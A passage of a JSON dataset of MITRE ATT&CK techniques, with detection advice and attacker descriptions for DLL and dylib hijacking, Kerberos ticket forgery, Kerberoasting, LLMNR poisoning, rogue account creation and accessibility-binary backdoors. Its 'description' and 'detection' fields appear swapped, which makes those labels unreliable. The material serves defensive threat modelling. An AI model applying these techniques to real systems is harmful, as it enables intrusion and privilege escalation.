                "description": "Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. \n\nRun path dependent libraries can include <code>LC_LOAD_DYLIB</code>, <code>LC_LOAD_WEAK_DYLIB</code>, and <code>LC_RPATH</code>. Other special keywords are recognized by the macOS loader are <code>@rpath</code>, <code>@loader_path</code>, and <code>@executable_path</code>.(Citation: Apple Developer Doco Archive Run-Path) These loader instructions can be examined for individual binaries or frameworks using the <code>otool -l</code> command. Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Github EmpireProject HijackScanner)",
                "detection": "Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path. Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.",
                "is_subtype": true,
                "platforms": [
                    "macOS"
                ]
            }
        },
        {
            "id": "T1102.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Bidirectional Communication",
                "chain_phase": "command-and-control",
                "description": "Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure or the presence of strong encryption. Packet capture analysis will require SSL/TLS inspection if data is encrypted. Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). User behavior monitoring may help to detect abnormal patterns of activity.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1574.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "DLL Search Order Hijacking",
                "chain_phase": "persistence",
                "description": "Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of `.manifest` and `.local` redirection files that do not correlate with software updates are suspicious.",
                "detection": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. \n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1574.008",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Path Interception by Search Order Hijacking",
                "chain_phase": "persistence",
                "description": "Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n",
                "detection": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. \n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in DLL Search Order Hijacking.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1574.007",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Path Interception by PATH Environment Variable",
                "chain_phase": "persistence",
                "description": "Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.\n\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if <code>C:\\example path</code> precedes </code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1574.009",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Path Interception by Unquoted Path",
                "chain_phase": "persistence",
                "description": "Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
                "detection": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths  and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>).  (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program.  \n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1567.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exfiltration to Cloud Storage",
                "chain_phase": "exfiltration",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.",
                "detection": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1567.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exfiltration to Code Repository",
                "chain_phase": "exfiltration",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.",
                "detection": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1560",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Archive Collected Data",
                "chain_phase": "collection",
                "description": "Archival software and archived files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known archival utilities. This may yield a significant number of benign events, depending on how systems in the environment are typically used.\n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures.\n\nConsider detecting writing of files with extensions and/or headers associated with compressed or encrypted file types. Detection efforts may focus on follow-on exfiltration activity, where compressed or encrypted files can be detected in transit with a network intrusion detection or data loss prevention system analyzing file headers.(Citation: Wikipedia File Header Signatures)",
                "detection": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
                "is_subtype": false,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1114.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Email Collection",
                "chain_phase": "collection",
                "description": "Monitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).",
                "detection": "Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files.\n\nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB. IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1134.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "SID-History Injection",
                "chain_phase": "defense-evasion",
                "description": "Examine data in user’s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)\n\nMonitor for Windows API calls to the <code>DsAddSidHistory</code> function. (Citation: Microsoft DsAddSidHistory)",
                "detection": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  An account can hold additional SIDs in the SID-History Active Directory attribute , allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values  may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as Remote Services, SMB/Windows Admin Shares, or Windows Remote Management.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1134.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Create Process with Token",
                "chain_phase": "defense-evasion",
                "description": "If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.\n\nAnalysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code> and <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",
                "detection": "Adversaries may create a new process with a duplicated token to escalate privileges and bypass access controls. An adversary can duplicate a desired access token with <code>DuplicateToken(Ex)</code> and use it with <code>CreateProcessWithTokenW</code> to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1558.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Silver Ticket",
                "chain_phase": "credential-access",
                "description": "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672).(Citation: ADSecurity Detecting Forged Tickets) \n\nMonitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.",
                "detection": "Adversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.\n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.\n\nPassword hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1558.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Golden Ticket",
                "chain_phase": "credential-access",
                "description": "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests.(Citation: ADSecurity Kerberos and KRBTGT)(Citation: CERT-EU Golden Ticket Protection)(Citation: Stealthbits Detect PtT 2019)\n\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\n\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. \n",
                "detection": "Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket. Golden tickets enable adversaries to generate authentication material for any account in Active Directory. \n\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.\n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets. The KRBTGT password hash may be obtained using OS Credential Dumping and privileged access to a domain controller.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1557.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
                "chain_phase": "credential-access",
                "description": "Monitor <code>HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient</code> for changes to the \"EnableMulticast\" DWORD value. A value of “0” indicates LLMNR is disabled. (Citation: Sternsecurity LLMNR-NBTNS)\n\nMonitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.\n\nDeploy an LLMNR/NBT-NS spoofing detection tool.(Citation: GitHub Conveigh) Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques.(Citation: Secure Ideas SMB Relay)",
                "detection": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.  \n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. \n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1558.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Kerberoasting",
                "chain_phase": "credential-access",
                "description": "Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).(Citation: Microsoft Detecting Kerberoasting Feb 2018)(Citation: AdSecurity Cracking Kerberos Dec 2015)",
                "detection": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. \n\nThis same attack could be executed using service tickets captured from network traffic.\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1136.002",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Domain Account",
                "chain_phase": "persistence",
                "description": "Monitor for processes and command-line parameters associated with domain account creation, such as <code>net user /add /domain</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary.",
                "detection": "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
                "is_subtype": true,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "T1136.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Local Account",
                "chain_phase": "persistence",
                "description": "Monitor for processes and command-line parameters associated with local account creation, such as <code>net user /add</code> or <code>useradd</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary.",
                "detection": "Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account.\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1547.009",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Shortcut Modification",
                "chain_phase": "persistence",
                "description": "Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.\n\nMonitor for LNK files created with a Zone Identifier value greater than 1, which may indicate that the LNK file originated from outside of the network.(Citation: BSidesSLC 2020 - LNK Elastic)",
                "detection": "Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use Masquerading to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1547.005",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Security Support Provider",
                "chain_phase": "persistence",
                "description": "Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)",
                "detection": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\n\nThe SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1546.008",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Accessibility Features",
                "chain_phase": "privilege-escalation",
                "description": "Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code>.",
                "detection": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. \n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP).  The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. \n\nOther accessibility features exist that may also be leveraged in a similar fashion: \n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1482",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Domain Trust Discovery",
                "chain_phase": "discovery",
                "description": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information, such as `nltest /domain_trusts`. Remote access tools with built-in features may interact directly with the Windows API to gather information. Look for the `DSEnumerateDomainTrusts()` Win32 API call to spot activity associated with [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Harmj0y Domain Trusts) Information may also be acquired through Windows system management tools such as [PowerShell](https://attack.mitre.org/techniques/T1059/001). The .NET method `GetAllTrustRelationships()` can be an indicator of [Domain Trust Discovery](https://attack.mitre.org/techniques/T1482).(Citation: Microsoft GetAllTrustRelationships)\n",
                "detection": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP. The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts.",
                "is_subtype": false,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1210",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Exploitation of Remote Services",
                "chain_phase": "lateral-movement",
                "description": "Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.",
